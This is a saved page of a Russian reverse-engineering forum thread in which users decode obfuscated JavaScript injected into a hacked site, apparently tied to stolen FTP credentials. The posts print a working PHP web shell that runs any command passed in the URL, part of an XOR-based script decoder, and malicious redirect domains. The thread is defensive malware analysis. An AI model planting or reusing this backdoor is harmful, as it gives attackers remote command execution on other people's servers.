<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<title>Помогите понять кусочек ява-скрипта - eXeL@B</title>
<meta NAME="DESCRIPTION" CONTENT="Нашёл гадостный код в html спрятанный с помощью eval(unescape(. Часть удалось расшифровать, а часть ещё в процессе. Возникли трудности с пониманием куска приведенного ниже. Вопрос собственно в том какой код должна выполнить eval">
<meta NAME="KEYWORDS" CONTENT="x64_dbg windbg ollydbg ida скачать взлом отладчик ассемблер дизассемблер крэкер cracker реверсер keygen кейген кодер патч патчер крэкми лоадер брутфорсер протектор распаковщик пароль ключ ключфайл шпион oep key защита программа winapi faq hiew windasm softice winhex">
<META NAME="Document-state" CONTENT="Dynamic">
<META HTTP-EQUIV="Pragma" CONTENT="no-cache"> 
<link rel="SHORTCUT ICON" href="/favicon.ico">
<meta name="viewport" content="width=device-width">
<link href="./skin/s0.css" type="text/css" rel="STYLESHEET">
<link href="./skin/code.css" type="text/css" rel="STYLESHEET">
<script type="text/javascript" src="./js/jq.js"></script>
<link rel="alternate" type="application/rss+xml" title="eXeL@B" href="./rss.php">
<style type="text/css">.username div .dops{display:none;}</style>
<link href="../menu.css" type="text/css" rel="stylesheet">
</head>

<body>
<a id="to_top"></a>
<div id="wrapper">
 
<div class="mob-hamburger"><span></span></div>
 
</center></div><script type='text/javascript'>
function lst(){var i=0;var htm='';var a='';var timer=setInterval(function(){if(i<10){i=i+10;}else{clearInterval(timer);i=0;}document.getElementById('kurs_container').style.marginLeft='-'+i+'px';},100);}
document.addEventListener('DOMContentLoaded',function(event){setTimeout(lst,1500);setInterval(lst,10000);});
</script></div></div>
<script type="text/javascript">
jQuery(document).ready(function(){
    jQuery(".mob-hamburger").on("click", function() {
        jQuery(".mob-hamburger").toggleClass("active");
        jQuery("#site-navigation").slideToggle();
		if (jQuery('.mob-hamburger').hasClass('active')) {
			var i = jQuery('#site-navigation').offset().top;
		} else { 
			var i = 0;
		}
			
		jQuery("html, body").animate({ scrollTop: i }, 600);
    });
	var btn = jQuery('#to_top');
	jQuery(window).scroll(function() {
		if (jQuery(window).scrollTop() > 300) {
			btn.addClass('show');
		} else {
			btn.removeClass('show');
		}
	});
	btn.on('click', function(e) {
		e.preventDefault();
		jQuery('html, body').animate({scrollTop:0}, '300');
	});
});
</script>
 
<div id="content">
<div align=center style="margin-top:15px">

<table class=tbTransparent>
<tr><td class=tbTransparent>
<span class=txtSm>Сейчас на форуме: <b><a target='_blank' href='?action=userinfo&amp;user=55995'>tyns777</a>, <a target='_blank' href='?action=userinfo&amp;user=42072'>zombi-vadim</a> (+3 невидимых)</b></span>
</td>
</tr>
</table>

<table class=forums>
 
</tr></table>

</div><br>
<script language="javascript" type="text/javascript" charset="windows-1251" src="templates/base.js"></script>

<div align=center><table class=forums><tr>
<td width=16 valign=top class=caption3><img src="./img/forum_icons/p.gif" width=16 height=16 alt=""></td>
<td width="100%" class=caption3><span class=header>&nbsp;<a href="../index.html"><b>eXeL@B</b></a> <b class=bulletHead>&#8212;&#8250;</b> <a href="action=vtopic&amp;forum=6&sortBy=0&page=0.html"><b>Программирование</b></a> <b class=bulletHead>&#8212;&#8250;</b> Помогите понять кусочек ява-скрипта</span></td>
</tr></table>
<table class=tbTransparent><tr><td class=tbTransparent><span class=txtSm><b> .  <b>1</b> . <a href="action=vthread&amp;forum=6&amp;topic=11393&amp;page=1.html">2</a> . <a href="action=vthread&amp;forum=6&amp;topic=11393&amp;page=1.html">&gt;&gt;</a></b></span></td></tr></table>
<table class=forums><tr>
<td width="15%" class=caption4><span class=txtSm><b>Посл.ответ</b></span></td>
<td width="85%" class=caption4><span class=txtSm><b>Сообщение</b></span></td></tr>
<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="1" onfocus="this.blur()" href="JavaScript:di('[b]ToBad[/b]','')">ToBad</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/702.gif" alt=""><br><span class=txtSm>Ранг: 450.3 (мудрец), 13thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.67'>Активность: 0.2<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=702">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 04 марта 2008 14:28 &middot; Поправил: ToBad <br><script type="text/javascript">QU('ToBad','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=ToBad" target="_blank">Личное сообщение</a> &middot;  <a href="#1" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11393&amp;page=0#1');return false;">#1</a> </span><div align=left><br>
Нашёл гадостный код в html спрятанный с помощью eval(unescape(. Часть удалось расшифровать, а часть ещё в процессе. Возникли трудности с пониманием куска приведенного ниже. Вопрос собственно в том какой код должна выполнить eval ?<br><br><code>function lOaC(tFne){<br>var yGULXdv=0, gySLH, esZs = tFne.length;<br>for(gySLH=0; gySLH&lt;esZs; gySLH++) yGULXdv+=tFne.charCodeAt(gySLH)*esZs;<br>return new String(yGULXdv)}<br><br>var hSJIR=eval(&#039;akrkgAuBmqe0n0t0sk.qc0aklBl0eqek&#039;.replace(/[qkBA0]/g, &#039;&#039;)).toString().replace(/[^@a-z0-9A-Z_.,-]/g,&#039;&#039;),iTPQx=lOaC(hSJIR),fnn  wb=new String(),nCp=0;<br></code>
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=181805&amp;user=702&amp;forum_n=6&amp;topic=11393&amp;page=0&amp;anchor=1" class="addthx" data-post="181805"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr><td class=caption4 colspan=2></td></tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="2" onfocus="this.blur()" href="JavaScript:di('[b][HEX][/b]','')">[HEX]</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/2365.gif" alt=""><br><span class=txtSm>Ранг: 467.7 (мудрец), 5thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.92'>Активность: 0.27<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=2365">Участник</a><br><font color=blue>Иной :)</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 04 марта 2008 14:58 &middot; Поправил: [HEX] <br><script type="text/javascript">QU('[HEX]','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=[HEX]" target="_blank">Личное сообщение</a> &middot;  <a href="#2" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11393&amp;page=0#2');return false;">#2</a> </span><div align=left><br>
Ну replace(/[qkBA0]/g,&#039;&#039;)<br>Это замена с помощью регулярки.<br>Тоесть из строки удаляются все перечисленные буквы.<br>В итоге из строчки akrkgAuBmqe0n0t0sk.qc0aklBl0eqek получаем arguments.callee<br><br>arguments.callee.toString() - это текст функции в которой эта строка и выполнилась.<br><br>Опять замена регуляркой replace(/[^@a-z0-9A-Z_.,-]/g,&#039;&#039;) - убивает все что не перечислено в списке.<br>Дальше через запятую это присвоение, определение и снова присвоение.<br><br>С функцией думаю разберешся сам? Там ничего спецефичного нет.<br>Если сам не осилишь, то приводи целиком функцию в которой это хозяйство.<br>А вообще можно не заморачиваться с пониманием, а тупо вместо eval() подставить alert() и тогда код не выполниться, а выведеться в окошке (в Опере сообщение алерта можно скопировать).
<br><br><font size="1"><i>-----<br>Computer Security Laboratory</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=181812&amp;user=2365&amp;forum_n=6&amp;topic=11393&amp;page=0&amp;anchor=2" class="addthx" data-post="181812"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="3" onfocus="this.blur()" href="JavaScript:di('[b]ToBad[/b]','')">ToBad</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/702.gif" alt=""><br><span class=txtSm>Ранг: 450.3 (мудрец), 13thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.67'>Активность: 0.2<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=702">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 04 марта 2008 16:12 &middot; Поправил: ToBad <br><script type="text/javascript">QU('ToBad','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=ToBad" target="_blank">Личное сообщение</a> &middot;  <a href="#3" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11393&amp;page=0#3');return false;">#3</a> </span><div align=left><br>
Изначально в появившемся на ftp сервере файле haitou.php код был такой:<br><code>&lt;?php<br>&#036;cmd=&#036;_GET[&#039;cmd&#039;];<br>if (isset(&#036;cmd)) {<br>        echo system(&#036;cmd);<br>    } else {<br>        if(ini_get(&#039;safe_mode&#039;)){<br>    echo &quot;allyourbasebelongstous_&quot;;<br>        } else {<br>    echo &quot;allyourbasebelongstous&quot;;<br>        }<br>    }<br>?&gt;              &lt;!-- [ 88636c650df8938331e4ac89b466a532 ] --&gt;&lt;script&gt;eval(unescape(&#039;function%20pZtqUm%28te..../<b>сокращено</b>/....%27%29%3B&#039;));&lt;/script&gt;&lt;!-- end --&gt;</code><br><br>После замены первого eval на alert код стал таким:<br><br>&lt;code&gt;function pZtqUm(teGg){<br><br>function lOaC(tFne){<br>var yGULXdv=0, gySLH, esZs=tFne.length;<br>for(gySLH=0;gySLH&lt;esZs;gySLH++) yGULXdv+=tFne.charCodeAt(gySLH)*esZs;<br>return new String(yGULXdv)}<br><br>teGg=unescape(teGg);<br>var hSJIR=eval(&#039;akrkgAuBmqe0n0t0sk.qc0aklBl0eqek&#039;.replace(/[qkBA0]/g, &#039;&#039;)).toString().replace(/[^@a-z0-9A-Z_.,-]/g,&#039;&#039;),iTPQx=lOaC(hSJIR),fnn   wb=new String(),nCp=0;<br>zBI=0;<br>for(var aJac=0;aJac&lt;teGg.length;aJac++){<br>fnnwb+=String.fromCharCode(teGg.charCodeAt(aJac)^(hSJIR.charCodeAt(nCp   )^iTPQx.charCodeAt(zBI)));<br>nCp++;<br>zBI++;<br>if(nCp&gt;hSJIR.length) nCp=0;<br>if(zBI&gt;iTPQx.length) zBI=0;}<br>eval(fnnwb);<br>fnnwb=&#039;&#039;;<br>return;}<br><br>pZtqUm(&#039;%32%30%38%35..../<b>сокращено</b>/....%73%2d%32&#039;);<br><br>А вот дальше если заменять последний eval на alert - получается бред....<br><br>Полная версия во вложении.
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=181819&amp;user=702&amp;forum_n=6&amp;topic=11393&amp;page=0&amp;anchor=3" class="addthx" data-post="181819"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="4" onfocus="this.blur()" href="JavaScript:di('[b]ToBad[/b]','')">ToBad</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/702.gif" alt=""><br><span class=txtSm>Ранг: 450.3 (мудрец), 13thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.67'>Активность: 0.2<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=702">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 04 марта 2008 16:17 <br><script type="text/javascript">QU('ToBad','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=ToBad" target="_blank">Личное сообщение</a> &middot;  <a href="#4" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11393&amp;page=0#4');return false;">#4</a> </span><div align=left><br>
Вложение...<br><br><img src="img/attach.gif" alt=""> <a href="./files/f65e_04.03.2008_CRACKLAB.rU.tgz">f65e_04.03.2008_CRACKLAB.rU.tgz</a> - scr.txt
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=181821&amp;user=702&amp;forum_n=6&amp;topic=11393&amp;page=0&amp;anchor=4" class="addthx" data-post="181821"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="5" onfocus="this.blur()" href="JavaScript:di('[b][HEX][/b]','')">[HEX]</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/2365.gif" alt=""><br><span class=txtSm>Ранг: 467.7 (мудрец), 5thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.92'>Активность: 0.27<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=2365">Участник</a><br><font color=blue>Иной :)</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 04 марта 2008 17:09 <br><script type="text/javascript">QU('[HEX]','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=[HEX]" target="_blank">Личное сообщение</a> &middot;  <a href="#5" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11393&amp;page=0#5');return false;">#5</a> </span><div align=left><br>
<code>&lt;?php <br>&#036;cmd=&#036;_GET[&#039;cmd&#039;]; <br>if (isset(&#036;cmd)) { <br>echo system(&#036;cmd); <br>} else { <br>if(ini_get(&#039;safe_mode&#039;)){ <br>echo &quot;allyourbasebelongstous_&quot;; <br>} else { <br>echo &quot;allyourbasebelongstous&quot;; <br>} <br>} <br>?&gt;</code><br>Это примитивный бэкдор он же шелл на пхп и никак не связан с явоскриптой.<br><br>А вот каша при расшифровке получается потому что длина меняется строки после замены eval() на alert() !<br>А длина тут участвует в дешифровке.<br><br>Так что надо ручками фиксить этот недочет. Если что получится я напишу.
<br><br><font size="1"><i>-----<br>Computer Security Laboratory</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=181834&amp;user=2365&amp;forum_n=6&amp;topic=11393&amp;page=0&amp;anchor=5" class="addthx" data-post="181834"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="6" onfocus="this.blur()" href="JavaScript:di('[b][HEX][/b]','')">[HEX]</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/2365.gif" alt=""><br><span class=txtSm>Ранг: 467.7 (мудрец), 5thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.92'>Активность: 0.27<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=2365">Участник</a><br><font color=blue>Иной :)</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 04 марта 2008 17:43 <br><script type="text/javascript">QU('[HEX]','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=[HEX]" target="_blank">Личное сообщение</a> &middot;  <a href="#6" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11393&amp;page=0#6');return false;">#6</a> </span><div align=left><br>
Писателю данного шифровщика мои аплодисменты. Пока это первый яваскрипт над котором пришлось ручками поработать и головой, а не тупой заменой на alert() <img src="img/smilies/s6.gif" alt=""><br><br>В общем вот скрипта расшифрованая.<br><br><img src="img/attach.gif" alt=""> <a href="./files/a098_04.03.2008_CRACKLAB.rU.tgz">a098_04.03.2008_CRACKLAB.rU.tgz</a> - virus.js
<br><br><font size="1"><i>-----<br>Computer Security Laboratory</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=181836&amp;user=2365&amp;forum_n=6&amp;topic=11393&amp;page=0&amp;anchor=6" class="addthx" data-post="181836"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="7" onfocus="this.blur()" href="JavaScript:di('[b]ToBad[/b]','')">ToBad</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/702.gif" alt=""><br><span class=txtSm>Ранг: 450.3 (мудрец), 13thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.67'>Активность: 0.2<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=702">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 04 марта 2008 17:45 <br><script type="text/javascript">QU('ToBad','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=ToBad" target="_blank">Личное сообщение</a> &middot;  <a href="#7" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11393&amp;page=0#7');return false;">#7</a> </span><div align=left><br>
<I><b>[HEX] </b>пишет:<br>А вот каша при расшифровке получается потому что длина меняется строки после замены eval() на alert() </I><br><br>А если создать функцию evax в которой вызывать alert ?
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=181838&amp;user=702&amp;forum_n=6&amp;topic=11393&amp;page=0&amp;anchor=7" class="addthx" data-post="181838"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="8" onfocus="this.blur()" href="JavaScript:di('[b]ToBad[/b]','')">ToBad</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/702.gif" alt=""><br><span class=txtSm>Ранг: 450.3 (мудрец), 13thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.67'>Активность: 0.2<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=702">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 04 марта 2008 17:55 <br><script type="text/javascript">QU('ToBad','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=ToBad" target="_blank">Личное сообщение</a> &middot;  <a href="#8" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11393&amp;page=0#8');return false;">#8</a> </span><div align=left><br>
Опоздал я с постом... <b>[HEX]</b> - спасибо за скриптик ! Если в двух словах, то многие обнаружили у себя на ftp серверах файл haitou.php по моему 28.02.2008... Гугл расскажет подробней. Не понятен принцип зачем такой скрипт засылать на халявный хостинг на narod.ru либо chat.ru... Ну и конечно удивляет массовость... Люди пишут что пароли к фтп были сложные... Интересно всё это.<br>Кстати поиск в гугле eval(unescape( показывает вполне нормальные странички заражённые этим, например h..p://www.colorsky.ru<br>То есть весь предыдущий код нужен для получения и выполнения функции из вложения ?<br>А если в двух словах, то что делает этот вирь ?
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=181840&amp;user=702&amp;forum_n=6&amp;topic=11393&amp;page=0&amp;anchor=8" class="addthx" data-post="181840"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="9" onfocus="this.blur()" href="JavaScript:di('[b][HEX][/b]','')">[HEX]</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/2365.gif" alt=""><br><span class=txtSm>Ранг: 467.7 (мудрец), 5thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.92'>Активность: 0.27<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=2365">Участник</a><br><font color=blue>Иной :)</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 04 марта 2008 18:08 &middot; Поправил: [HEX] <br><script type="text/javascript">QU('[HEX]','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=[HEX]" target="_blank">Личное сообщение</a> &middot;  <a href="#9" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11393&amp;page=0#9');return false;">#9</a> </span><div align=left><br>
<b>ToBad</b><br>упс... ступил =) но чувствую что могло и не прокатить если кроме длины участвует и каждый символ при расшифровке (типа хэша вычисляется от всего кода и потом этим хэшом расщифровывается переданая строка). Я востановил все как положено и получил &quot;хэш&quot; и уже дальше работал с этим хэшом.<br><br>Я попытался вникнуть в скрипт и особо ничего вредного в нем не обнаружил кроме как заруливания трафика с помощью ифрейма и создания куки с пометкой инсталлирован или нет. Вся метода запутывания тут сводиться к тупому замусориванию строчек и этот мусор убирается регуляркой. Так что если в человеческий вид захочешь привести, то замени строчки на нормальные и будет проще читать.<br><br>Коды на фтп сложные, но пинчей хватают многие, а тут уж какой бы пароль небыл все равно уплывет. Одну подобную админку выцепил. Возможно имеет к этому какое то дело hxxp://shivaom.net/classes/<br>Ну и 2traff.cn думаю тут тоже замешан.
<br><br><font size="1"><i>-----<br>Computer Security Laboratory</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=181841&amp;user=2365&amp;forum_n=6&amp;topic=11393&amp;page=0&amp;anchor=9" class="addthx" data-post="181841"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="10" onfocus="this.blur()" href="JavaScript:di('[b][HEX][/b]','')">[HEX]</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/2365.gif" alt=""><br><span class=txtSm>Ранг: 467.7 (мудрец), 5thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.92'>Активность: 0.27<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=2365">Участник</a><br><font color=blue>Иной :)</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 04 марта 2008 18:17 <br><script type="text/javascript">QU('[HEX]','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=[HEX]" target="_blank">Личное сообщение</a> &middot;  <a href="#10" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11393&amp;page=0#10');return false;">#10</a> </span><div align=left><br>
Более читабельный вид.<br><br><img src="img/attach.gif" alt=""> <a href="./files/2955_04.03.2008_CRACKLAB.rU.tgz">2955_04.03.2008_CRACKLAB.rU.tgz</a> - virus.js
<br><br><font size="1"><i>-----<br>Computer Security Laboratory</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=181843&amp;user=2365&amp;forum_n=6&amp;topic=11393&amp;page=0&amp;anchor=10" class="addthx" data-post="181843"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="11" onfocus="this.blur()" href="JavaScript:di('[b]ToBad[/b]','')">ToBad</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/702.gif" alt=""><br><span class=txtSm>Ранг: 450.3 (мудрец), 13thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.67'>Активность: 0.2<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=702">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 04 марта 2008 18:25 <br><script type="text/javascript">QU('ToBad','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=ToBad" target="_blank">Личное сообщение</a> &middot;  <a href="#11" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11393&amp;page=0#11');return false;">#11</a> </span><div align=left><br>
<I><b>[HEX]</b> пишет:<br>Коды на фтп сложные, но пинчей хватают многие </I><br><br>Получается пинч схватили хостеры narod.ru и chat.ru ? Таким образом у меня на гавностраничке этот файлик появился ? Кстати все html тоже содержали подобное г. Причем по 3-4 вставки...
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=181845&amp;user=702&amp;forum_n=6&amp;topic=11393&amp;page=0&amp;anchor=11" class="addthx" data-post="181845"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="12" onfocus="this.blur()" href="JavaScript:di('[b][HEX][/b]','')">[HEX]</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/2365.gif" alt=""><br><span class=txtSm>Ранг: 467.7 (мудрец), 5thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.92'>Активность: 0.27<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=2365">Участник</a><br><font color=blue>Иной :)</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 04 марта 2008 18:34 <br><script type="text/javascript">QU('[HEX]','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=[HEX]" target="_blank">Личное сообщение</a> &middot;  <a href="#12" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11393&amp;page=0#12');return false;">#12</a> </span><div align=left><br>
<b>ToBad</b><br>Может конечно и админ хостинга, но что то меня терзают смутные сомнения что народ.ру хранит пароли открытым текстом <img src="img/smilies/s8.gif" alt=""><br><br>А кроме админа народа знает пароль наверное сам создатель сайта (тоесть ты сам). Так что смысл понимаешь кто мог подцепить пинча?<br><br>В итоге получаем сцыль на следующего формата hxxp://localhost.7d556ec17a92a7fb.2traff.cn/traff2.cn/<br>localhost - это имя задефейсеного хоста, потом случайная компбинация 0-9a-f, 2traff.cn/traff2.cn/<br>Ну а там уже пытаються впарить тебе говно по самые помидоры <img src="img/smilies/s15.gif" alt=""> так что кто хочет проверить свой антивирусник можете прогуляться по адресу.
<br><br><font size="1"><i>-----<br>Computer Security Laboratory</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=181847&amp;user=2365&amp;forum_n=6&amp;topic=11393&amp;page=0&amp;anchor=12" class="addthx" data-post="181847"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="13" onfocus="this.blur()" href="JavaScript:di('[b]ToBad[/b]','')">ToBad</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/702.gif" alt=""><br><span class=txtSm>Ранг: 450.3 (мудрец), 13thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.67'>Активность: 0.2<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=702">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 04 марта 2008 18:54 <br><script type="text/javascript">QU('ToBad','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=ToBad" target="_blank">Личное сообщение</a> &middot;  <a href="#13" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11393&amp;page=0#13');return false;">#13</a> </span><div align=left><br>
<I><b>[HEX]</b> пишет:<br>А кроме админа народа знает пароль наверное сам создатель сайта (тоесть ты сам). Так что смысл понимаешь кто мог подцепить пинча? </I><br><br>Я не спорю, что мог подцепить пинча, просто не сходится кое что. У меня все ftp вбиты в фаре, в открытом виде, естественно пинч их увёл бы, а кроме 2-х на народе и одного на чате было и семь нормальных ftp серверов. Это г. завелось только на народе и чате...
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=181850&amp;user=702&amp;forum_n=6&amp;topic=11393&amp;page=0&amp;anchor=13" class="addthx" data-post="181850"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
